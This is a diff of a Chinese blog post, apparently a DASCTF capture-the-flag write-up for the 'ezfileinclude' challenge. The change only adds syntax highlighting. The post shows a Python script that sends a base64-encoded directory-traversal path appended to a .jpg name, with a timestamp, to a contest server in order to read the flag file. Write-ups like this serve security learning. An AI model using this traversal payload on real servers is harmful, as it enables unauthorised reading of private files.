@@ -159,16 +159,17 @@
                 <h1 id="DASCTF七月赛"><a href="#DASCTF七月赛" class="headerlink" title="DASCTF七月赛"></a>DASCTF七月赛</h1><h2 id="ezfileinclude"><a href="#ezfileinclude" class="headerlink" title="ezfileinclude"></a>ezfileinclude</h2><p>这题当时我被卡在time那里，傻了。</p>
 <p>实际上直接用python的time.time()就行了，但我忘了，一直在考虑用反应头age。</p>
 <p>f=要base64加密一下，目录穿越读flag，但发现../被过滤，url绕过也不行，甚至读不出image.php，思考一番，应该是只能读jpg文件，所以在gpy.jpg后面加上../就行了，payload:</p>
-<pre><code>import time,requests,base64
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> time<span class="token punctuation">,</span>requests<span class="token punctuation">,</span>base64
 
-url = &#39;http://183.129.189.60:10009/image.php?t=&#39;
-url2 = &#39;&amp;f=&#39;
+url <span class="token operator">=</span> <span class="token string">'http://183.129.189.60:10009/image.php?t='</span>
+url2 <span class="token operator">=</span> <span class="token string">'&amp;f='</span>
 
-aim = b&#39;gqy.jpg../../../../../../flag&#39;
-aim = str(base64.b64encode(aim), encoding=&#39;utf-8&#39;)
-r = requests.get(url + str(int(time.time())) + url2 + aim)
+aim <span class="token operator">=</span> b<span class="token string">'gqy.jpg../../../../../../flag'</span>
+aim <span class="token operator">=</span> str<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>aim<span class="token punctuation">)</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> str<span class="token punctuation">(</span>int<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> url2 <span class="token operator">+</span> aim<span class="token punctuation">)</span>
 
-print(r.text)</code></pre><p>这里看到大佬的payload顺便学习了一下python字符串前加b’gqy.jpg../../../../../../flag’的意义，这里我觉得不加也无所谓。</p>
+<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre>
+<p>这里看到大佬的payload顺便学习了一下python字符串前加b’gqy.jpg../../../../../../flag’的意义，这里我觉得不加也无所谓。</p>
 <blockquote>
 <h4 id="1、字符串前加-u"><a href="#1、字符串前加-u" class="headerlink" title="1、字符串前加 u"></a>1、字符串前加 u</h4><p>例：u”我是含有中文字符组成的字符串。”</p>
 <p>作用：</p>
